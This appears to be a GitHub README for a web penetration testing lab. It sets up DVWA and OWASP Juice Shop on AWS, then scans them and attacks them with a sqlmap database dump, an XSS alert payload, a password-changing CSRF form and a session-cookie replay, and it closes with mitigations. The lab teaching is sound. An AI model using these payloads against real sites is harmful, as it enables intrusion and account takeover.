# Web Application Penetration Testing

## 📌 Overview
This project demonstrates a full Web Application Penetration Testing workflow by setting up, scanning, exploiting, and documenting vulnerabilities in a deliberately insecure web application hosted on AWS.

---

## 🚀 Steps to Follow

### 🔹 Step 1: Deploy a Vulnerable Web Application
We deploy **DVWA (Damn Vulnerable Web App)** and **OWASP Juice Shop** on an **AWS EC2 instance**.

#### 🛠 Prerequisites
- AWS Account / Azure Subscription
- Linux-based VM (Ubuntu recommended)
- Basic Linux command-line knowledge

#### 🏗 Option 1: Deploy DVWA on AWS EC2
```bash
# Connect to EC2 instance
ssh -i your-key.pem ubuntu@your-ec2-public-ip

# Update system & install dependencies
sudo apt update && sudo apt install -y apache2 mariadb-server php php-mysql unzip git

# Download & configure DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA

# Set up MySQL for DVWA
sudo mysql -u root -e "CREATE DATABASE dvwa;"
sudo mysql -u root -e "CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';"
sudo mysql -u root -e "GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';"
sudo mysql -u root -e "FLUSH PRIVILEGES;"

# Restart Apache
sudo systemctl restart apache2
```
Access **DVWA** at: `http://your-ec2-public-ip/DVWA/`

#### 🏗 Option 2: Deploy OWASP Juice Shop
```bash
sudo apt install -y docker.io
sudo docker run -d -p 3000:3000 bkimminich/juice-shop
```
Access **Juice Shop** at: `http://your-ec2-public-ip:3000`

---

### 🔹 Step 2: Reconnaissance & Scanning

#### 🔍 Tools Required
- **Nmap** (Port Scanning & Service Discovery)
- **Nikto** (Web Server Vulnerability Scanning)
- **WhatWeb** (Web Technology Fingerprinting)

#### 📌 Run Nmap for Port Scanning
```bash
nmap -sV -A your-ec2-public-ip
```
Find open ports, web server details, and outdated software versions.

#### 📌 Scan for Vulnerabilities with Nikto
```bash
nikto -h http://your-ec2-public-ip/DVWA/
```
Identifies security flaws like **default credentials**, **XSS**, and **SQL Injection**.

#### 📌 Fingerprint Technologies with WhatWeb
```bash
whatweb http://your-ec2-public-ip/DVWA/
```
Identifies CMS, frameworks, and server details for targeting vulnerabilities.

---

### 🔹 Step 3: Exploiting Vulnerabilities

#### 💉 SQL Injection (SQLi) with SQLmap
```bash
sqlmap -u "http://your-ec2-public-ip/DVWA/vulnerabilities/sqli/?id=1" --dbs --batch
```
Extracts **database names, tables, and credentials**.

#### 🛑 Cross-Site Scripting (XSS) with Burp Suite
```html
<script>alert('XSS Found')</script>
```
If the alert pops up, XSS is successful.

#### 🔓 Cross-Site Request Forgery (CSRF)
```html
<form action="http://your-ec2-public-ip/DVWA/vulnerabilities/csrf/" method="POST">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="submit" value="Click Here">
</form>
```
Tricks a logged-in user into **changing their password** without consent.

#### 🏴‍☠️ Session Hijacking (Authentication Exploit)
```bash
curl -b "PHPSESSID=abcd1234" http://your-ec2-public-ip/DVWA/
```
If successful, an attacker can log in without credentials.

---

### 🔹 Step 4: Reporting & Mitigation

📋 **Penetration Testing Report** using Dradis/OpenVAS

✅ **Mitigation Recommendations:**
- **SQL Injection** → Use prepared statements.
- **XSS** → Implement input sanitization & Content Security Policy (CSP).
- **CSRF** → Enforce CSRF tokens.
- **Session Hijacking** → Enable Secure Cookies & HttpOnly Flag.

---

## 🎯 Final Outcome
✅ You have successfully performed **Web Application Penetration Testing**.

---

## 🤝 Contributing
Pull requests are welcome! If you find any improvements or issues, feel free to submit them.

## 📜 License
This project is licensed under the **MIT License**.
This project is for educational purposes only. Do not use it for unethical hacking.

## 📬 Contact
For queries, reach out via **GitHub Issues** or **email**.

---

🔥 Happy Hacking! 🔥

